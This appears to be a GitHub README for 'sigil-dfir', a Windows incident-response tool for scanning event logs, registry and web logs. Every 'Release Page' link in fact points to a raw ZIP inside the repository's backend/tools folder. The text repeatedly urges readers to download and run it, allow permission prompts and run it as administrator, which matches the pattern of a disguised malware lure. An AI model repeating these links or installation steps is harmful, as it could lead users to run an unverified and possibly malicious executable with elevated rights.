# 🛡️ sigil-dfir - Find Signs of System Compromise

[![Download sigil-dfir](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip)

## 🔽 Download

Visit this page to download: https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip

Use the latest release for Windows. After you open the release page, look for the file made for Windows. Download it to your PC, then open it to start the app or unpack it first if the release comes as a ZIP file.

## 🧭 What SIGIL Does

SIGIL DFIR helps you look for signs that a Windows PC may have been compromised. It gathers common evidence sources, checks them against detection rules, and shows the results in a simple interface.

It is useful when you need to:

- Review Windows Event Logs
- Check web server logs
- Inspect registry data
- Hunt for indicators of compromise
- Build a report from the findings

## ✨ What You Can Do

- Open a clean GUI instead of working only from the command line
- Parse EVTX files from Windows Event Logs
- Review alerts that match Sigma-like rules
- Map findings to MITRE ATT&CK techniques
- See a confidence score for each finding
- Search for indicators of compromise
- Export a report for sharing or review

## 💻 What You Need

SIGIL DFIR runs on Windows. For the best results, use:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 2 GB of free disk space
- A modern web browser
- Permission to open local files on your computer

If your release includes separate frontend and backend files, keep both in the same folder unless the release notes say otherwise.

## 📦 Install on Windows

1. Open the release page: https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip
2. Download the Windows file from the latest release
3. If the file is a ZIP archive, right-click it and choose Extract All
4. Open the extracted folder
5. Run the main Windows app file if one is included
6. If the release uses a local web app setup, start the backend first, then open the frontend in your browser

If Windows asks for permission, choose Allow so the app can access the local files you want to review

## 🚀 First Run

After you launch SIGIL DFIR, you will usually see a dashboard with options to load evidence and review findings.

A simple first run looks like this:

1. Open the app
2. Choose a case or load a data folder
3. Add Windows Event Logs, registry files, or web logs
4. Wait while SIGIL scans the files
5. Review the findings list
6. Open a finding to see its details
7. Check the timeline to see how events connect

## 🗂️ Supported Data

SIGIL DFIR is built to work with common incident response artifacts, including:

- Windows Event Logs
- EVTX files
- Web server logs
- Registry hives
- IOC lists
- Triage data from Windows systems

## 🖥️ Main Screens

### Dashboard

The dashboard gives you a quick view of loaded data, scan status, and key findings.

### Findings

The findings view shows matches, confidence scores, and related rule details.

### Timeline

The timeline view helps you track activity in time order so you can spot what happened first.

## 🔍 How to Review a Case

1. Load the files from the computer you want to check
2. Wait for the scan to finish
3. Sort findings by score or type
4. Open each match and read the details
5. Compare the events with the timeline
6. Look for repeated logins, file changes, new services, or strange network activity
7. Export the report when you need to share the case

## 🧠 How Matching Works

SIGIL DFIR uses detection rules to flag activity that may need review. These rules compare known patterns with the data in your logs and files.

The app can help you spot:

- Unusual logon activity
- Suspicious process behavior
- Registry changes tied to persistence
- Web log activity that looks out of place
- Events linked to known attacker methods

Each finding includes a confidence score so you can focus on the items that matter most

## 📝 Report Output

Use the report feature when you need a written record of your review. The report can help you:

- Share results with another analyst
- Keep a record for a case file
- Review findings later
- Compare scans from different machines

## ⚙️ Local Setup for Advanced Users

If you want to run the source version, use the folders in the repository:

### Frontend
- Go to the `frontend` folder
- Install the packages
- Start the web app

### Backend
- Go to the `backend` folder
- Install the Python packages
- Start the API server on port 8001

This setup is for users who want to work with the code directly. For most Windows users, the release download is the simplest path

## 📁 Typical Folder Layout

A release may include items like:

- `app.exe` or another Windows launcher
- `frontend` files for the interface
- `backend` files for the API
- `docs` for screenshots and help files
- `reports` for exported case output

## 🔐 Privacy and File Access

SIGIL DFIR works on files you choose to load. It does not need your email or account login to review local evidence. Keep your case files in a safe folder and only open data you trust

## 🛠️ Common Issues

### The app will not open
- Check that the file finished downloading
- Right-click the app and choose Run as administrator
- Make sure Windows did not block the file

### The screen stays blank
- Wait a moment while the app loads data
- Reload the page if you are using a browser-based release
- Check that the backend is running if the release needs one

### Files do not load
- Confirm that the file type is supported
- Make sure the file is not damaged
- Try loading one file at a time

### Scan results look empty
- Check that the right evidence files were added
- Make sure the files came from the system you want to review
- Try a different log set if the machine has few events

## 📚 Best Use Tips

- Start with a small set of files
- Review high-score findings first
- Use the timeline to confirm the order of events
- Keep notes while you inspect a case
- Export the report after each review session

## 🧩 Project Structure

- `frontend` - user interface
- `backend` - API and parsing logic
- `docs` - screenshots and support files
- `scripts` - helper tools, if included
- `README.md` - project overview

## 📎 Release Page

Download the Windows release here: https://raw.githubusercontent.com/Hassan1829/sigil-dfir/main/backend/tools/dfir-sigil-1.9-beta.3.zip